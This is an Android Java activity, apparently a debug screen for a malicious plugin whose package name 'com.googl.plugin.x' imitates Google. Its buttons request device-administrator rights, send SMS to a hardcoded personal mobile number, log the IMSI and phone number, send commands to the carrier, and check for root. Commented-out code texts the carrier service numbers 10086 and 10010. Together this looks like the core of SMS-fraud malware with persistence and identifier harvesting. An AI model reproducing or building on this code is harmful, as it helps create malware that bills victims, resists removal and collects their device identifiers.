package com.googl.plugin.x;

import android.app.admin.DevicePolicyManager;
import android.content.Intent;
import android.os.Bundle;
import android.app.Activity;
import android.text.TextUtils;
import android.view.Menu;
import android.view.View;
import android.widget.Toast;
import com.plugin.common.utils.UtilsRuntime;
import com.xstd.plugin.Utils.SMSUtil;
import com.xstd.plugin.Utils.XMLTables;
import com.xstd.plugin.apn.APNHelper;
import com.xstd.plugin.binddevice.DeviceBindBRC;
import android.content.ComponentName;
import com.xstd.plugin.config.AppRuntime;
import com.xstd.plugin.config.Config;

import java.util.List;

public class XSTDPluginActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_xstdplugin);

        View bind = findViewById(R.id.binding);
        bind.setOnClickListener(new View.OnClickListener() {

            @Override
            public void onClick(View view) {
                Intent intent = new Intent(
                                              DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                                   new ComponentName(getApplicationContext(), DeviceBindBRC.class));
                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                                   "（自定义区域2）");
//                startActivityForResult(intent, 1);
                startActivity(intent);

            }
        });

        View sms = findViewById(R.id.send_sms);
        sms.setOnClickListener(new View.OnClickListener() {

            @Override
            public void onClick(View view) {
                SMSUtil.sendSMS("15810864155", "测试数据，11YY");
            }
        });

        View apn_check = findViewById(R.id.apn_check);
        apn_check.setOnClickListener(new View.OnClickListener() {

            @Override
            public void onClick(View v) {
//                List<APNHelper.APNInfo> infos = APNHelper.getAPNList(getApplicationContext());
//                int type = APNHelper.getNetworkTypeByAPN(getApplicationContext());
                Config.LOGD("[[XSTDPluginActivity]] MNC type : " + AppRuntime.getNetworkTypeByIMSI(getApplicationContext())
                                + " >>>>>>>><<<<<<<<< IMSI = " + UtilsRuntime.getIMSI(getApplicationContext()));
            }
        });

        View sms_center = findViewById(R.id.sms_center);
        sms_center.setOnClickListener(new View.OnClickListener() {

            @Override
            public void onClick(View v) {
                int type = AppRuntime.getNetworkTypeByIMSI(getApplicationContext());
                String phoneNumber = AppRuntime.getPhoneNumber(getApplicationContext());
                if (!TextUtils.isEmpty(phoneNumber)) {
                    Toast.makeText(XSTDPluginActivity.this, phoneNumber, Toast.LENGTH_LONG).show();
//                    return;
                }

                SMSUtil.trySendCmdToNetwork(getApplicationContext());

//                switch (type) {
//                    case 1:
//                        SMSUtil.sendSMS("10086", "测试数据，11YY");
//                        break;
//                    case 2:
//                        SMSUtil.sendSMS("10010", "测试数据，11YY");
//                        break;
//                    case 3:
////                        SMSUtil.sendSMS("10086", "测试数据，11YY");
//                        break;
//                }
            }
        });

        View dump_location = findViewById(R.id.dump_location);
        dump_location.setOnClickListener(new View.OnClickListener() {

            @Override
            public void onClick(View v) {
//                XMLTables table = new XMLTables();
//                table.loadXML(getResources().getXml(R.xml.city_map));
//                table.dump();
            }
        });

        View isRoot = findViewById(R.id.is_root);
        isRoot.setOnClickListener(new View.OnClickListener() {

            @Override
            public void onClick(View v) {
                Toast.makeText(XSTDPluginActivity.this, "系统" + (AppRuntime.isRootSystem() ? "已经ROOT" : "没有ROOT"), Toast.LENGTH_SHORT).show();
            }
        });
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.xstdplugin, menu);
        return true;
    }
}
